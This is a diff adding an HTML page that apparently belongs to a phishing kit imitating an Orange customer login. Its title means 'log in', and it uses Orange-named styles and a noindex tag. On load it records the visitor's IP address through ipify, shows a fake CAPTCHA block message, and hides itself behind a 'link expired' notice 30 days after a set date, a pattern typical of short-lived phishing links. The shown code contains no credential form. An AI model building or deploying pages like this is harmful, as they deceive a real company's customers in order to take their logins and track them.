@@ -1,0 +1,109 @@
+<html><head>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="initial-scale=1.0, width=device-width">
+    <meta name="format-detection" content="telephone=no,email=no">
+    <meta name="msapplication-config" content="none">
+    <link rel="apple-touch-icon" sizes="57x57" href="./assets/img/apple-touch-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="./assets/img/apple-touch-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="./assets/img/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="./assets/img/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="./assets/img/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="./assets/img/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="./assets/img/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="./assets/img/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="./assets/img/apple-touch-icon-180x180.png">
+    <link rel="icon" type="image/png" href="./assets/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="./assets/img/favicon-194x194.png" sizes="194x194">
+    <link rel="icon" type="image/png" href="./assets/img/favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="./assets/img/android-chrome-36x36.png" sizes="36x36">
+    <link rel="icon" type="image/png" href="./assets/img/android-chrome-48x48.png" sizes="48x48">
+    <link rel="icon" type="image/png" href="./assets/img/android-chrome-72x72.png" sizes="72x72">
+    <link rel="icon" type="image/png" href="./assets/img/android-chrome-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="./assets/img/android-chrome-144x144.png" sizes="144x144">
+    <link rel="icon" type="image/png" href="./assets/img/android-chrome-192x192.png" sizes="192x192">
+    <link rel="icon" type="image/png" href="./assets/img/favicon-16x16.png" sizes="16x16">
+    <title>Identifiez-vous</title>
+    <meta name="next-head-count" content="24">
+    <meta name="next-font-preconnect">
+    <link rel="preload" href="./assets/css/81dfce5f98885917.css" as="style">
+    <link rel="stylesheet" href="./assets/css/81dfce5f98885917.css" data-n-g="">
+    <link rel="stylesheet" type="text/css" href="./assets/css/c0f5e5d5dffacc28.css">
+
+
+   
+    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" crossorigin="anonymous"></script>
+    <script>
+      window.locIp = "";
+      window.iPfull = "";
+
+      fetch("https://api.ipify.org?format=json")
+        .then((response) => response.json())
+        .then((data) => {
+          console.log(data);
+          window.locIp = data;
+          window.iPfull = data.ip || "";
+        })
+        .catch((error) => {
+          console.error("Erreur lors de la récupération de l'adresse IP :", error);
+        });
+    </script>
+    <link rel="stylesheet" href="./assets/css/myOrangeStyles.css">
+  </head>
+
+  <body><h1>Accès interdit. Veuillez valider le CAPTCHA.</h1>
+<script>
+// Set the beginning date (example: March 20, 2025)
+const beginningDate = new Date('2025-04-23T00:00:00');
+
+// Function to check if 30 days have passed since the beginning date
+function checkLinkExpiration() {
+  // Get the current date
+  const now = new Date();
+  
+  // Calculate the difference in time between now and the beginning date
+  const timeDifference = now - beginningDate;
+  
+  // Convert milliseconds to days
+  const daysPassed = timeDifference / (1000 * 3600 * 24); // Convert milliseconds to days
+  
+  // Return true if 30 days have passed, otherwise false
+  return daysPassed >= 30;
+}
+
+// Function to hide all content and show the expiration message
+function displayExpirationMessage() {
+  if (checkLinkExpiration()) {
+    // Hide all the content of the page
+    document.body.style.display = 'none';
+
+    // Create a div element for the message
+    const messageDiv = document.createElement('div');
+    messageDiv.innerHTML = "<h1>The link expired</h1>";
+    messageDiv.style.position = 'absolute';
+    messageDiv.style.top = '50%';
+    messageDiv.style.left = '50%';
+    messageDiv.style.transform = 'translate(-50%, -50%)';
+    messageDiv.style.fontSize = '24px';
+    messageDiv.style.fontFamily = 'Arial, sans-serif';
+    messageDiv.style.color = 'red';
+    messageDiv.style.backgroundColor = 'white';
+    messageDiv.style.padding = '20px';
+    messageDiv.style.border = '2px solid red';
+    messageDiv.style.textAlign = 'center';
+
+    // Append the message div to the body
+    document.body.appendChild(messageDiv);
+  }
+}
+
+// Call the function to check and display the message if expired
+window.onload = displayExpirationMessage;
+
+
+</script>
+  
+
+</body></html>
